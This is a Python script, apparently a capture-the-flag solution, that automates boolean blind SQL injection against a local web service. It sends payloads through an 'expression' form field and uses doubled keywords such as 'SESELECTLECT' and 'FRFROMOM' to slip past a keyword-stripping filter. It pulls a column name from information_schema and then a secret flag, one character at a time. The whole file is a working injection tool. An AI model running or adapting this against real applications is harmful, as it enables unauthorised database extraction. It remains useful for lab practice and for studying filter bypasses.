import requests

URL = "http://localhost:8090"
TABLE_NAME = "s3cr3t_t4bl3"
HEADERS = {'Content-Type': 'application/x-www-form-urlencoded'}

def send_payload(payload):
    data = {'expression': payload}
    r = requests.post(URL, data=data, headers=HEADERS)
    return "You are right, congratulations!" in r.text

def extract_column_name():
    print("[*] Bruteforcing column name...")
    column_name = ""
    max_len = 30  # Giới hạn chiều dài tên cột
    for i in range(1, max_len + 1):
        found = False
        for ascii_code in range(32, 127):  # ký tự in được
            payload = f"ASASCIICII(SUBSTR((SESELECTLECT column_name FRFROMOM infoorrmation_schema.columns WHWHEREERE table_name='{TABLE_NAME}' LIMIT 1 OFFSET 1),{i},1))={ascii_code}"
            if send_payload(payload):
                column_name += chr(ascii_code)
                print(f"  [+] Found char {i}: {chr(ascii_code)}")
                found = True
                break
        if not found:
            break  # Không còn ký tự nào nữa
    return column_name

def extract_flag(col_name):
    print(f"[*] Bruteforcing flag from column `{col_name}`...")
    flag = ""
    max_len = 100
    for i in range(1, max_len + 1):
        found = False
        for ascii_code in range(32, 127):  # ký tự in được
            payload = f"ASASCIICII(SUBSTR((SESELECTLECT {col_name} FRFROMOM {TABLE_NAME}),{i},1))={ascii_code}"
            if send_payload(payload):
                flag += chr(ascii_code)
                print(f"  [+] Found char {i}: {chr(ascii_code)}")
                found = True
                break
        if not found:
            break  # Kết thúc flag
    return flag

if __name__ == "__main__":
    print("=== Blind SQLi Automation ===")
    column = extract_column_name()
    print(f"[+] Column name: {column}")
    flag = extract_flag(column)
    print(f"[+] Flag: {flag}")
